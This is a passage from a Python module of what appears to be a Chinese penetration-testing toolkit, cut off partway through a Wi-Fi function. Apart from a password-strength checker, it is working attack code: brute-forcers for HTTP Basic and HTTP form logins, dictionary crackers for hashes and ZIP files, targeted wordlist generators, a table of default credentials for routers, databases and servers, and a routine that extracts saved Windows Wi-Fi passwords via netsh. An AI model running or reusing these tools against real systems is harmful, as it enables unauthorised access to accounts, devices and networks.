# -*- coding: utf-8 -*-
"""
密码攻击模块 - 密码破解、字典生成、哈希破解等工具
"""

import os
import sys
import re
import hashlib
import zipfile
import time
import base64
import urllib.parse
import urllib.request
import urllib.error
from collections import Counter
from core.colors import *
from core.utils import *


class PasswordAttacks:
    """密码攻击类 - 提供密码强度检测、字典生成、暴力破解等工具"""

    # 常见密码TOP 100
    COMMON_PASSWORDS = [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "sunshine",
        "qwerty123", "iloveyou", "princess", "admin", "welcome",
        "666666", "abc123", "football", "123123", "monkey",
        "654321", "!@#$%^&*", "charlie", "aa123456", "donald",
        "password1", "qwerty12345", "1234567890", "letmein", "password123",
        "dragon", "baseball", "adobe123", "admin123", "master",
        "photoshop", "1234", "ashley", "bailey", "shadow",
        "121212", "flower", "hottie", "login", "passw0rd",
        "starwars", "000000", "trustno1", "loveme", "buster",
        "whatever", "jordan", "michael", "superman", "freedom",
        "hello", "nicole", "daniel", "andrew", "joshua",
        "matthew", "thomas", "george", "robert", "samuel",
        "secret", "test", "tigger", "samantha", "pepper",
        "butterfly", "hunter", "ranger", "justin", "baseball1",
        "access", "passion", "computer", "tequiero", "gentle",
        "cookie", "lovely", "pass123", "password12", "987654321",
        "qwerty123456", "123456a", "a123456", "123456789a", "123321",
        "qwertyuiop", "zxcvbnm", "qwertz", "1q2w3e4r", "qwerty1",
        "pass1234", "test123", "abc123456", "1qaz2wsx", "qwe123",
    ]

    # 默认凭据字典 (设备/服务 -> [(用户名, 密码), ...])
    DEFAULT_CREDENTIALS = {
        "router": [
            ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
            ("admin", "root"), ("root", "admin"), ("root", "123456"),
            ("admin", "123456"), ("admin", "Admin"), ("admin", ""),
            ("user", "user"), ("support", "support"),
        ],
        "mysql": [
            ("root", ""), ("root", "root"), ("root", "admin"),
            ("root", "123456"), ("admin", "admin"),
            ("test", ""), ("root", "password"),
        ],
        "postgresql": [
            ("postgres", ""), ("postgres", "postgres"),
            ("postgres", "admin"), ("admin", "admin"),
            ("postgres", "password"), ("postgres", "123456"),
        ],
        "mssql": [
            ("sa", ""), ("sa", "sa"), ("sa", "admin"),
            ("sa", "123456"), ("sa", "password"),
            ("admin", "admin"), ("admin", "password"),
        ],
        "ssh": [
            ("root", "root"), ("root", "admin"), ("root", "123456"),
            ("root", "password"), ("root", "toor"),
            ("admin", "admin"), ("admin", "password"),
            ("test", "test"), ("user", "user"),
        ],
        "ftp": [
            ("anonymous", ""), ("anonymous", "anonymous"),
            ("ftp", "ftp"), ("admin", "admin"),
            ("admin", "password"), ("admin", "123456"),
            ("root", "root"), ("user", "user"),
        ],
        "telnet": [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "1234"), ("admin", ""),
            ("root", "root"), ("root", "admin"),
            ("cisco", "cisco"), ("cisco", "password"),
        ],
        "tomcat": [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "tomcat"), ("tomcat", "tomcat"),
            ("admin", "admin123"), ("admin", "manager"),
            ("manager", "manager"), ("role1", "role1"),
        ],
        "weblogic": [
            ("weblogic", "weblogic"), ("weblogic", "password"),
            ("weblogic", "welcome1"), ("admin", "admin"),
            ("admin", "password"), ("system", "system"),
            ("portal", "portal"), ("guest", "guest"),
        ],
        "jenkins": [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "123456"), ("admin", "admin123"),
        ],
        "redis": [
            ("", ""), ("redis", "redis"), ("redis", "password"),
            ("root", "root"), ("admin", "admin"),
        ],
        "mongodb": [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "123456"), ("root", "root"),
            ("", ""),
        ],
        "elasticsearch": [
            ("elastic", "elastic"), ("elastic", "changeme"),
            ("admin", "admin"), ("kibana", "kibana"),
        ],
        "docker": [
            ("root", "root"), ("admin", "admin"),
            ("admin", "password"), ("root", "password"),
        ],
        "vnc": [
            ("", "admin"), ("", "password"), ("", "123456"),
            ("", "vnc"), ("", "root"),
            ("admin", "admin"), ("root", "root"),
        ],
    }

    # 密码变换规则
    TRANSFORM_RULES = [
        lambda s: s,                           # 原样
        lambda s: s.capitalize(),              # 首字母大写
        lambda s: s.upper(),                   # 全大写
        lambda s: s + "123",                   # 加123
        lambda s: s + "123456",                # 加123456
        lambda s: s + "!",                     # 加!
        lambda s: s + "@",                     # 加@
        lambda s: s + "#",                     # 加#
        lambda s: s + "2024",                  # 加年份
        lambda s: s + "2025",                  # 加年份
        lambda s: s + "2026",                  # 加年份
        lambda s: re.sub(r'e', '3', s),        # e->3
        lambda s: re.sub(r'a', '@', s),        # a->@
        lambda s: re.sub(r's', '$', s),        # s->$
        lambda s: re.sub(r'o', '0', s),        # o->0
        lambda s: re.sub(r'i', '1', s),        # i->1
        lambda s: s[::-1],                     # 反转
    ]

    # 密码强度等级
    STRENGTH_LEVELS = {
        "very_weak": (0, "非常弱", Colors.DARK_RED),
        "weak": (1, "弱", Colors.RED),
        "medium": (2, "中等", Colors.YELLOW),
        "strong": (3, "强", Colors.LIGHT_GREEN),
        "very_strong": (4, "非常强", Colors.GREEN),
    }

    # 常见密码模式
    PASSWORD_PATTERNS = [
        (r'^\d{6,10}$', '纯数字(6-10位)'),
        (r'^\d{3,6}$', '纯数字(3-6位)'),
        (r'^[a-z]{6,}$', '纯小写字母'),
        (r'^[A-Z]{6,}$', '纯大写字母'),
        (r'^[a-zA-Z]{6,}$', '纯字母'),
        (r'^[a-zA-Z0-9]{6,}$', '字母+数字'),
        (r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$', '大小写字母+数字'),
        (r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*]).{8,}$', '强密码(大小写+数字+特殊字符)'),
    ]

    def __init__(self):
        self.name = "PasswordAttacks"

    # ==================== 1. 密码强度检测 ====================

    def password_strength_checker(self, password):
        """
        密码强度检测
        检测密码的强度等级并给出改进建议
        """
        print_section("密码强度检测")
        print_info(f"正在检测密码强度...")

        result = {
            "password": password,
            "length": len(password),
            "score": 0,
            "strength": "",
            "issues": [],
            "suggestions": [],
            "patterns": [],
            "crack_time_estimate": "",
        }

        try:
            score = 0
            length = len(password)
            result["length"] = length

            # 长度评分
            if length >= 16:
                score += 40
            elif length >= 12:
                score += 30
            elif length >= 8:
                score += 20
            elif length >= 6:
                score += 10
            else:
                result["issues"].append("密码长度太短(小于6位)")

            # 字符种类评分
            has_lower = bool(re.search(r'[a-z]', password))
            has_upper = bool(re.search(r'[A-Z]', password))
            has_digit = bool(re.search(r'\d', password))
            has_special = bool(re.search(r'[!@#$%^&*()_\-+=<>?/\\|~`{}\[\].,;:\'\" ]', password))

            char_types = sum([has_lower, has_upper, has_digit, has_special])
            score += char_types * 15

            if not has_lower:
                result["issues"].append("缺少小写字母")
            if not has_upper:
                result["issues"].append("缺少大写字母")
            if not has_digit:
                result["issues"].append("缺少数字")
            if not has_special:
                result["issues"].append("缺少特殊字符")

            # 常见模式检测
            if password.lower() in self.COMMON_PASSWORDS:
                score -= 30
                result["issues"].append("密码在常见密码列表中")
                result["patterns"].append("常见密码")

            # 键盘序列检测
            keyboard_patterns = [
                r'qwerty', r'asdfgh', r'zxcvbn', r'qwert', r'asdf',
                r'123456', r'12345', r'1234567', r'12345678', r'123456789',
                r'abcdef', r'abc123', r'passw', r'111111', r'000000',
            ]
            for pattern in keyboard_patterns:
                if pattern in password.lower():
                    score -= 15
                    result["issues"].append(f"包含键盘序列/常见模式: {pattern}")
                    result["patterns"].append("键盘序列")
                    break

            # 重复字符检测
            if re.search(r'(.)\1{3,}', password):
                score -= 10
                result["issues"].append("包含重复字符")

            # 生日/年份模式检测
            if re.search(r'(19|20)\d{2}', password):
                score -= 10
                result["patterns"].append("包含年份")

            # 用户名检测(如果包含)
            if re.search(r'^(admin|root|user|test|guest)', password.lower()):
                score -= 10
                result["patterns"].append("常见用户名")

            # 确定强度等级
            score = max(0, min(100, score))
            result["score"] = score

            if score < 20:
                result["strength"] = "very_weak"
                crack_time = "几秒内"
            elif score < 40:
                result["strength"] = "weak"
                crack_time = "几分钟到几小时内"
            elif score < 60:
                result["strength"] = "medium"
                crack_time = "几天到几周内"
            elif score < 80:
                result["strength"] = "strong"
                crack_time = "数年到数十年"
            else:
                result["strength"] = "very_strong"
                crack_time = "数十年以上"

            result["crack_time_estimate"] = crack_time

            # 生成改进建议
            if score < 60:
                if length < 12:
                    result["suggestions"].append("增加密码长度到至少12位")
                if char_types < 4:
                    result["suggestions"].append("混合使用大小写字母、数字和特殊字符")
                if "常见密码" in str(result["issues"]):
                    result["suggestions"].append("避免使用常见密码")
                if "键盘序列" in str(result["issues"]):
                    result["suggestions"].append("避免使用键盘序列")
                result["suggestions"].append("建议使用密码管理器生成随机密码")

            # 显示结果
            strength_name = self.STRENGTH_LEVELS.get(result["strength"], ("", "未知", Colors.WHITE))
            color = strength_name[2]
            print(f"\n{Colors.BOLD}密码: {Colors.RESET}{password}")
            print(f"{Colors.BOLD}长度: {Colors.RESET}{length} 位")
            print(f"{Colors.BOLD}得分: {Colors.RESET}{score}/100")
            print(f"{Colors.BOLD}强度: {color}{strength_name[1]}{Colors.RESET}")
            print(f"{Colors.BOLD}预估破解时间: {Colors.RESET}{crack_time}")
            print(f"{Colors.BOLD}字符类型: {Colors.RESET}", end="")
            types = []
            if has_lower: types.append(f"{Colors.GREEN}小写{Colors.RESET}")
            else: types.append(f"{Colors.RED}小写{Colors.RESET}")
            if has_upper: types.append(f"{Colors.GREEN}大写{Colors.RESET}")
            else: types.append(f"{Colors.RED}大写{Colors.RESET}")
            if has_digit: types.append(f"{Colors.GREEN}数字{Colors.RESET}")
            else: types.append(f"{Colors.RED}数字{Colors.RESET}")
            if has_special: types.append(f"{Colors.GREEN}特殊{Colors.RESET}")
            else: types.append(f"{Colors.RED}特殊{Colors.RESET}")
            print(", ".join(types))

            if result["issues"]:
                print(f"\n{Colors.YELLOW}发现的问题:{Colors.RESET}")
                for issue in result["issues"]:
                    print(f"  {Colors.DIM}•{Colors.RESET} {issue}")

            if result["suggestions"]:
                print(f"\n{Colors.CYAN}改进建议:{Colors.RESET}")
                for suggestion in result["suggestions"]:
                    print(f"  {Colors.GREEN}→{Colors.RESET} {suggestion}")

            print_success("密码强度检测完成")

        except Exception as e:
            print_error(f"密码强度检测失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 2. 字典生成器 ====================

    def wordlist_generator(self, base_words=None, rules=None, min_len=1, max_len=32, output_file=None):
        """
        字典生成器 - 基于规则生成密码字典
        """
        print_section("字典生成器")
        print_info("正在生成密码字典...")

        result = {
            "total": 0,
            "words": [],
            "output_file": None,
        }

        try:
            if base_words is None:
                base_words = ["admin", "password", "root", "user", "test", "guest", "123456", "qwerty"]

            if rules is None:
                # 使用默认规则索引
                rules = list(range(len(self.TRANSFORM_RULES)))
            elif isinstance(rules, list) and all(isinstance(r, int) for r in rules):
                pass  # 已经是索引列表
            else:
                rules = list(range(len(self.TRANSFORM_RULES)))

            print_info(f"基础词数量: {len(base_words)}")
            print_info(f"应用规则数: {len(rules)}")
            print_info(f"最小长度: {min_len}, 最大长度: {max_len}")

            generated = set()
            for word in base_words:
                word = word.strip()
                if not word:
                    continue
                for rule_idx in rules:
                    if rule_idx < len(self.TRANSFORM_RULES):
                        try:
                            transformed = self.TRANSFORM_RULES[rule_idx](word)
                            if min_len <= len(transformed) <= max_len:
                                generated.add(transformed)
                        except Exception:
                            continue

            # 添加基础词本身
            for word in base_words:
                word = word.strip()
                if word and min_len <= len(word) <= max_len:
                    generated.add(word)

            result["words"] = sorted(generated)
            result["total"] = len(generated)

            print(f"\n{Colors.BOLD}生成统计:{Colors.RESET}")
            print(f"  总词数: {Colors.CYAN}{len(generated)}{Colors.RESET}")
            print(f"  基础词来源: {len(base_words)} 个")
            print(f"  变换规则: {len(rules)} 条")

            # 按长度分组显示
            length_groups = Counter(len(w) for w in generated)
            print(f"\n{Colors.BOLD}长度分布:{Colors.RESET}")
            for length in sorted(length_groups.keys()):
                bar = "█" * min(length_groups[length], 50)
                print(f"  {length:2d}位: {bar} {length_groups[length]}")

            # 保存到文件
            if output_file:
                try:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        for word in result["words"]:
                            f.write(word + '\n')
                    result["output_file"] = output_file
                    print_success(f"字典已保存到: {output_file}")
                except Exception as e:
                    print_error(f"保存字典文件失败: {e}")

            # 预览前20个
            preview = result["words"][:20]
            if preview:
                print(f"\n{Colors.BOLD}预览 (前{len(preview)}个):{Colors.RESET}")
                for i, word in enumerate(preview, 1):
                    print(f"  {Colors.DIM}{i:3d}.{Colors.RESET} {word}")

            print_success(f"字典生成完成，共 {len(generated)} 个词")

        except Exception as e:
            print_error(f"字典生成失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 3. HTTP Basic认证暴力破解 ====================

    def brute_force_http_basic(self, url, usernames=None, passwords=None, timeout=10):
        """
        HTTP Basic认证暴力破解
        """
        print_section("HTTP Basic认证暴力破解")
        print_info(f"目标: {url}")

        result = {
            "target": url,
            "found": [],
            "total_attempts": 0,
            "success": False,
        }

        try:
            if usernames is None:
                usernames = ["admin", "root", "user", "administrator", "test"]
            if passwords is None:
                passwords = self.COMMON_PASSWORDS[:50]

            # 测试目标是否支持Basic认证
            try:
                test_req = urllib.request.Request(url)
                test_req.add_header("User-Agent", get_random_ua())
                test_resp = urllib.request.urlopen(test_req, timeout=timeout)
                if test_resp.getcode() != 401:
                    print_warning("目标未返回401状态码，可能不需要Basic认证")
                    print_info(f"HTTP状态码: {test_resp.getcode()}")
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    print_info("目标需要Basic认证（返回401）")
                else:
                    print_warning(f"目标返回HTTP {e.code}")
            except Exception as e:
                print_warning(f"探测认证方式时出错: {e}")

            total = len(usernames) * len(passwords)
            print_info(f"用户名字典: {len(usernames)} 个")
            print_info(f"密码字典: {len(passwords)} 个")
            print_info(f"总尝试次数: {total}")

            progress = ProgressBar(total, prefix="爆破进度")
            found_any = False

            for username in usernames:
                if found_any:
                    break
                for password in passwords:
                    if found_any:
                        break
                    try:
                        # 构造Basic Auth
                        credentials = f"{username}:{password}"
                        encoded = base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
                        auth_header = f"Basic {encoded}"

                        req = urllib.request.Request(url)
                        req.add_header("Authorization", auth_header)
                        req.add_header("User-Agent", get_random_ua())

                        resp = urllib.request.urlopen(req, timeout=timeout)

                        if resp.getcode() in (200, 204, 301, 302):
                            print_success(f"找到凭据! {Colors.GREEN}{username}:{password}{Colors.RESET}")
                            result["found"].append({
                                "username": username,
                                "password": password,
                                "status": resp.getcode(),
                            })
                            result["success"] = True
                            found_any = True
                        else:
                            progress.update()

                    except urllib.error.HTTPError as e:
                        if e.code == 401:
                            progress.update()
                        else:
                            progress.update()
                    except Exception as e:
                        progress.update()

                    result["total_attempts"] += 1

            if result["success"]:
                print_success(f"爆破成功！找到 {len(result['found'])} 组有效凭据")
            else:
                print_warning("爆破未找到有效凭据")

        except Exception as e:
            print_error(f"HTTP Basic认证爆破失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 4. HTTP表单暴力破解 ====================

    def brute_force_http_form(self, url, username_field="username", password_field="password",
                              usernames=None, passwords=None, extra_data=None,
                              success_indicator=None, error_indicator=None, method="POST", timeout=10):
        """
        HTTP表单暴力破解
        """
        print_section("HTTP表单暴力破解")
        print_info(f"目标: {url}")
        print_info(f"请求方法: {method}")

        result = {
            "target": url,
            "found": [],
            "total_attempts": 0,
            "success": False,
        }

        try:
            if usernames is None:
                usernames = ["admin", "root", "user", "administrator", "test"]
            if passwords is None:
                passwords = self.COMMON_PASSWORDS[:50]
            if extra_data is None:
                extra_data = {}

            total = len(usernames) * len(passwords)
            print_info(f"用户名字典: {len(usernames)} 个")
            print_info(f"密码字典: {len(passwords)} 个")
            print_info(f"总尝试次数: {total}")

            progress = ProgressBar(total, prefix="爆破进度")
            found_any = False

            for username in usernames:
                if found_any:
                    break
                for password in passwords:
                    try:
                        form_data = extra_data.copy()
                        form_data[username_field] = username
                        form_data[password_field] = password

                        data = urllib.parse.urlencode(form_data).encode('utf-8')

                        req = urllib.request.Request(url, data=data, method=method)
                        req.add_header("User-Agent", get_random_ua())
                        req.add_header("Content-Type", "application/x-www-form-urlencoded")

                        resp = urllib.request.urlopen(req, timeout=timeout)
                        body = resp.read().decode('utf-8', errors='ignore')

                        # 判断是否成功
                        is_success = False

                        if success_indicator and success_indicator in body:
                            is_success = True
                        elif error_indicator and error_indicator not in body:
                            is_success = True
                        elif not success_indicator and not error_indicator:
                            # 启发式判断
                            if "login" not in body.lower() and "error" not in body.lower():
                                pass  # 不确定
                            if resp.getcode() == 302:
                                is_success = True

                        if is_success:
                            print_success(f"找到凭据! {Colors.GREEN}{username}:{password}{Colors.RESET}")
                            result["found"].append({
                                "username": username,
                                "password": password,
                                "status": resp.getcode(),
                            })
                            result["success"] = True
                            found_any = True
                        else:
                            progress.update()

                    except urllib.error.HTTPError as e:
                        if e.code == 302:
                            print_success(f"找到凭据(重定向)! {Colors.GREEN}{username}:{password}{Colors.RESET}")
                            result["found"].append({
                                "username": username,
                                "password": password,
                                "status": e.code,
                            })
                            result["success"] = True
                            found_any = True
                        else:
                            progress.update()
                    except Exception as e:
                        progress.update()

                    result["total_attempts"] += 1

            if result["success"]:
                print_success(f"爆破成功！找到 {len(result['found'])} 组有效凭据")
            else:
                print_warning("爆破未找到有效凭据")

        except Exception as e:
            print_error(f"HTTP表单爆破失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 5. 哈希字典破解 ====================

    def hash_cracker_dictionary(self, target_hash, hash_type="md5", wordlist=None):
        """
        哈希字典破解 - 支持MD5、SHA1、SHA256
        """
        print_section("哈希字典破解")
        print_info(f"目标哈希: {target_hash}")
        print_info(f"哈希类型: {hash_type.upper()}")

        result = {
            "target_hash": target_hash,
            "hash_type": hash_type,
            "found": False,
            "plaintext": None,
            "attempts": 0,
        }

        try:
            hash_type = hash_type.lower().replace("-", "").replace("_", "")

            if wordlist is None:
                wordlist = self.COMMON_PASSWORDS + [
                    "admin123", "root123", "pass123", "test123",
                    "Password1", "Password123", "Admin123",
                    "qwerty123", "letmein", "welcome123",
                    "sunshine1", "princess1", "monkey123",
                    "iloveyou123", "123456789a", "a123456789",
                    "password!", "admin!", "root!",
                    "P@ssw0rd", "Adm1n", "R00t",
                    "123456a", "a12345", "abc123456",
                    "1q2w3e4r", "qwertyuiop", "asdfghjkl",
                    "zxcvbnm", "password123456", "987654321",
                    "passw0rd", "p@ssword", "p@ssw0rd",
                ]

            print_info(f"字典大小: {len(wordlist)} 个")
            print_info(f"正在匹配...")

            progress = ProgressBar(len(wordlist), prefix="破解进度")

            for word in wordlist:
                try:
                    word_encoded = word.encode('utf-8')

                    if hash_type == "md5":
                        computed = hashlib.md5(word_encoded).hexdigest()
                    elif hash_type == "sha1" or hash_type == "sha-1":
                        computed = hashlib.sha1(word_encoded).hexdigest()
                    elif hash_type == "sha256" or hash_type == "sha-256":
                        computed = hashlib.sha256(word_encoded).hexdigest()
                    elif hash_type == "sha224" or hash_type == "sha-224":
                        computed = hashlib.sha224(word_encoded).hexdigest()
                    elif hash_type == "sha384" or hash_type == "sha-384":
                        computed = hashlib.sha384(word_encoded).hexdigest()
                    elif hash_type == "sha512" or hash_type == "sha-512":
                        computed = hashlib.sha512(word_encoded).hexdigest()
                    else:
                        print_error(f"不支持的哈希类型: {hash_type}")
                        result["error"] = f"Unsupported hash type: {hash_type}"
                        return result

                    if computed.lower() == target_hash.lower():
                        result["found"] = True
                        result["plaintext"] = word
                        result["attempts"] = progress.current + 1

                        print(f"\n{Colors.GREEN}{Colors.BOLD}=" * 50)
                        print(f"{Colors.GREEN}{Colors.BOLD}破解成功!{Colors.RESET}")
                        print(f"{Colors.GREEN}{Colors.BOLD}哈希值: {target_hash}{Colors.RESET}")
                        print(f"{Colors.GREEN}{Colors.BOLD}明文:   {word}{Colors.RESET}")
                        print(f"{Colors.GREEN}{Colors.BOLD}尝试次数: {result['attempts']}{Colors.RESET}")
                        print(f"{Colors.GREEN}{Colors.BOLD}=" * 50)

                        print_success(f"哈希 {target_hash[:16]}... 破解成功: {word}")
                        return result

                    progress.update()

                except Exception:
                    progress.update()

            result["attempts"] = len(wordlist)
            print_warning(f"字典中未找到匹配的明文")
            print_info(f"已尝试 {len(wordlist)} 个词，未匹配成功")

        except Exception as e:
            print_error(f"哈希破解失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 6. ZIP密码破解 ====================

    def zip_password_cracker(self, zip_path, wordlist=None):
        """
        ZIP密码破解 - 使用zipfile模块
        """
        print_section("ZIP密码破解")
        print_info(f"目标文件: {zip_path}")

        result = {
            "file": zip_path,
            "found": False,
            "password": None,
            "attempts": 0,
        }

        try:
            if not os.path.exists(zip_path):
                print_error(f"ZIP文件不存在: {zip_path}")
                result["error"] = "File not found"
                return result

            # 先尝试无密码
            try:
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    zf.testzip()
                    print_info("ZIP文件无密码保护")
                    result["found"] = True
                    result["password"] = ""
                    print_success("ZIP文件无密码")
                    return result
            except RuntimeError:
                print_info("ZIP文件有密码保护")
            except Exception as e:
                print_error(f"打开ZIP文件失败: {e}")
                result["error"] = str(e)
                return result

            if wordlist is None:
                wordlist = self.COMMON_PASSWORDS + [
                    "123", "1234", "pass", "passwd", "zip",
                    "archive", "backup", "data", "secret",
                    "private", "confidential", "001", "000",
                    "666", "888", "999", "1314", "520",
                ]

            print_info(f"密码字典: {len(wordlist)} 个")
            progress = ProgressBar(len(wordlist), prefix="破解进度")

            for password in wordlist:
                try:
                    with zipfile.ZipFile(zip_path, 'r') as zf:
                        pwd = password.encode('utf-8')
                        try:
                            zf.extractall(pwd=pwd)
                            result["found"] = True
                            result["password"] = password
                            result["attempts"] = progress.current + 1

                            print(f"\n{Colors.GREEN}{Colors.BOLD}=" * 50)
                            print(f"{Colors.GREEN}{Colors.BOLD}ZIP密码破解成功!{Colors.RESET}")
                            print(f"{Colors.GREEN}{Colors.BOLD}文件: {zip_path}{Colors.RESET}")
                            print(f"{Colors.GREEN}{Colors.BOLD}密码: {password}{Colors.RESET}")
                            print(f"{Colors.GREEN}{Colors.BOLD}尝试次数: {result['attempts']}{Colors.RESET}")
                            print(f"{Colors.GREEN}{Colors.BOLD}=" * 50)

                            print_success(f"ZIP密码破解成功: {password}")
                            return result

                        except RuntimeError:
                            progress.update()
                        except Exception:
                            progress.update()

                except zipfile.BadZipFile:
                    print_error("无效的ZIP文件格式")
                    result["error"] = "Bad ZIP file"
                    return result
                except Exception:
                    progress.update()

            result["attempts"] = len(wordlist)
            print_warning("字典中未找到正确密码")

        except Exception as e:
            print_error(f"ZIP密码破解失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 7. 默认密码检查器 ====================

    def default_password_checker(self, target_type=None):
        """
        默认密码检查器 - 查询设备/服务的默认凭据
        """
        print_section("默认密码检查器")
        print_info("正在查询默认凭据...")

        result = {
            "target_type": target_type,
            "credentials": {},
        }

        try:
            if target_type:
                target_lower = target_type.lower()
                # 模糊匹配
                matched = {}
                for key, creds in self.DEFAULT_CREDENTIALS.items():
                    if target_lower in key or key in target_lower:
                        matched[key] = creds

                if matched:
                    print_info(f"找到以下匹配类型:")
                    for key in matched:
                        print(f"  {Colors.CYAN}{Colors.BOLD}{key}{Colors.RESET}")

                    for service_type, creds in matched.items():
                        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}{service_type.upper()}{Colors.RESET}")
                        result["credentials"][service_type] = []
                        headers = ["用户名", "密码"]
                        rows = []
                        for username, password in creds:
                            display_pwd = password if password else "(空)"
                            rows.append([username, display_pwd])
                            result["credentials"][service_type].append({
                                "username": username,
                                "password": password,
                            })
                        print_table(headers, rows, color=Colors.CYAN)
                else:
                    print_warning(f"未找到 '{target_type}' 的默认凭据")
                    print_info(f"可用类型: {', '.join(sorted(self.DEFAULT_CREDENTIALS.keys()))}")
            else:
                print_info("显示所有可用默认凭据类型:")
                for i, service_type in enumerate(sorted(self.DEFAULT_CREDENTIALS.keys()), 1):
                    creds = self.DEFAULT_CREDENTIALS[service_type]
                    print(f"  {Colors.DIM}{i:2d}.{Colors.RESET} {Colors.CYAN}{service_type}{Colors.RESET} "
                          f"({Colors.DIM}{len(creds)} 组凭据{Colors.RESET})")

                print(f"\n{Colors.BOLD}提示:{Colors.RESET} 使用 target_type 参数查询特定类型的默认凭据")

            print_success("默认凭据查询完成")

        except Exception as e:
            print_error(f"默认密码查询失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 8. 常见密码生成器 ====================

    def common_password_generator(self, keywords=None, include_numbers=True, include_special=True, output_file=None):
        """
        常见密码生成器 - 根据关键词或个人信息的变体生成可能密码
        """
        print_section("常见密码生成器")
        print_info("正在生成密码...")

        result = {
            "passwords": [],
            "total": 0,
            "output_file": None,
        }

        try:
            if keywords is None:
                keywords = ["admin", "password", "root", "user", "test", "guest"]

            print_info(f"关键词: {keywords}")
            print_info(f"包含数字: {include_numbers}")
            print_info(f"包含特殊字符: {include_special}")

            passwords = set()

            # 常见后缀
            common_suffixes = []
            if include_numbers:
                common_suffixes.extend([
                    "", "1", "12", "123", "1234", "12345", "123456",
                    "1234567", "12345678", "01", "2024", "2025", "2026",
                    "666", "888", "999", "000", "007", "520", "1314",
                ])
            if include_special:
                common_suffixes.extend([
                    "!", "@", "#", "$", "%", "&", "*",
                    "!", "!!", "@@", "##",
                ])

            # 常见前缀
            common_prefixes = [""]
            if include_numbers:
                common_prefixes.extend(["", "1", "123", "1234"])

            # 常见变换
            transforms = [
                lambda s: s.lower(),
                lambda s: s.upper(),
                lambda s: s.capitalize(),
                lambda s: s[0].upper() + s[1:].lower() if s else s,
            ]

            for keyword in keywords:
                keyword = keyword.strip().lower()
                if not keyword:
                    continue

                for transform in transforms:
                    base = transform(keyword)
                    if base:
                        passwords.add(base)

                    for prefix in common_prefixes:
                        for suffix in common_suffixes:
                            candidate = f"{prefix}{base}{suffix}"
                            if 4 <= len(candidate) <= 32:
                                passwords.add(candidate)

                # 添加关键词的Leet变体
                leet_map = {
                    'a': ['a', '4', '@'],
                    'b': ['b', '8'],
                    'e': ['e', '3'],
                    'g': ['g', '9'],
                    'i': ['i', '1', '!'],
                    'l': ['l', '1'],
                    'o': ['o', '0'],
                    's': ['s', '5', '$'],
                    't': ['t', '7'],
                    'z': ['z', '2'],
                }

                for i in range(2 ** min(len(keyword), 4)):  # 限制组合数
                    leet_word = list(keyword)
                    bits = i
                    for j, ch in enumerate(keyword):
                        if ch in leet_map and j < 4:
                            alt = leet_map[ch]
                            idx = bits % len(alt)
                            bits //= len(alt)
                            leet_word[j] = alt[idx]
                    leet_variant = ''.join(leet_word)
                    if leet_variant != keyword:
                        passwords.add(leet_variant)
                        if include_numbers:
                            passwords.add(leet_variant + "123")
                            passwords.add(leet_variant + "!")
                            passwords.add(leet_variant + "2024")

            # 添加常见日期模式
            if include_numbers:
                for month in range(1, 13):
                    for day in [1, 10, 15, 20, 25]:
                        date_str = f"{month:02d}{day:02d}"
                        passwords.add(date_str)
                        for year in ["24", "25", "26", "2024", "2025", "2026"]:
                            passwords.add(f"{date_str}{year}")
                            passwords.add(f"{year}{date_str}")

            # 过滤并排序
            result["passwords"] = sorted(
                [p for p in passwords if 4 <= len(p) <= 32],
                key=lambda x: (len(x), x)
            )
            result["total"] = len(result["passwords"])

            print(f"\n{Colors.BOLD}生成统计:{Colors.RESET}")
            print(f"  总密码数: {Colors.CYAN}{len(result['passwords'])}{Colors.RESET}")
            print(f"  关键词: {len(keywords)} 个")

            # 按长度分组
            length_groups = Counter(len(p) for p in result["passwords"])
            print(f"\n{Colors.BOLD}长度分布:{Colors.RESET}")
            for length in sorted(length_groups.keys()):
                bar = "█" * min(length_groups[length] // 2, 50)
                print(f"  {length:2d}位: {bar} {length_groups[length]}")

            # 预览
            preview = result["passwords"][:30]
            print(f"\n{Colors.BOLD}预览 (前{len(preview)}个):{Colors.RESET}")
            for i, pwd in enumerate(preview, 1):
                print(f"  {Colors.DIM}{i:3d}.{Colors.RESET} {pwd}")

            if len(result["passwords"]) > 30:
                print(f"  {Colors.DIM}... 共 {len(result['passwords'])} 个密码{Colors.RESET}")

            # 保存到文件
            if output_file:
                try:
                    with open(output_file, 'w', encoding='utf-8') as f:
                        for pwd in result["passwords"]:
                            f.write(pwd + '\n')
                    result["output_file"] = output_file
                    print_success(f"密码已保存到: {output_file}")
                except Exception as e:
                    print_error(f"保存密码文件失败: {e}")

            print_success(f"密码生成完成，共 {result['total']} 个")

        except Exception as e:
            print_error(f"密码生成失败: {e}")
            result["error"] = str(e)

        return result

    # ==================== 9. WiFi密码解密 (Windows) ====================

    def wifi_password_decrypt(self, ssid=None):
        """
        WiFi密码解密 - 从Windows系统提取已保存的WiFi密码
        """
        print_section("WiFi密码解密")
        print_info("正在提取WiFi密码...")

        result = {
            "profiles": [],
            "total": 0,
            "os": os.name,
        }

        try:
            if os.name != 'nt':
                print_warning("此功能仅支持Windows系统")
                result["error"] = "Not supported on this OS"
                result["os"] = os.name
                return result

            print_info("检测到Windows系统，正在读取WiFi配置文件...")

            # 获取所有WiFi配置文件
            stream = os.popen('netsh wlan show profiles')
            output = stream.read()
            stream.close()

            # 解析配置文件列表
            profiles = []
            for line in output.split('\n'):
                if ':' in line and ('所有用户配置文件' in line or 'User profiles' in line):
                    profile_name = line.split(':')[1].strip()
                    if profile_name:
                        profiles.append(profile_name)

            if not profiles:
                # 尝试另一种解析方式
                for line in output.split('\n'):
                    if ':' in line:
                        parts = line.split(':')
